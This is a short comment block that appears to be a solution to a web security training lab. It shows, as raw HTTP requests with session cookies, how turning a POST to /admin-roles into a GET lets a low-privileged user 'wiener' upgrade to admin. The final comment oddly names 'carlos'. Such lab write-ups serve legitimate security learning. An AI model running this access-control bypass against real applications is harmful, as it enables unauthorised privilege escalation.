/*

1) Getting admin panel authorised endpoints requests
    1.a) POST /admin-roles HTTP/2
         Cookie: session=Boxhp6KvvoNWMyuyCpKXnRlfK9sS0IBY
         username=carlos&action=upgrade         //this upgrades carlos to admin
    
    1.b) Logout of admin

2) Login to wiener
    2.a) Send POST /admin-roles HTTP/2 to repeater
    2.b) Paste the wiener's session cookie in this request instead of admins session cookie
         POST /admin-roles
         Cookie: session=GI1LObNNdwxE2GNEl1JBCzJjLyHpnyMh
         username=wiener&action=upgrade          //error unauthorised

    2.c) Conver the method to GET
         GET /admin-roles?username=wiener&action=upgrade HTTP/2
         Cookie: session=GI1LObNNdwxE2GNEl1JBCzJjLyHpnyMh        //302 found
                                        //carlos is admin now

*/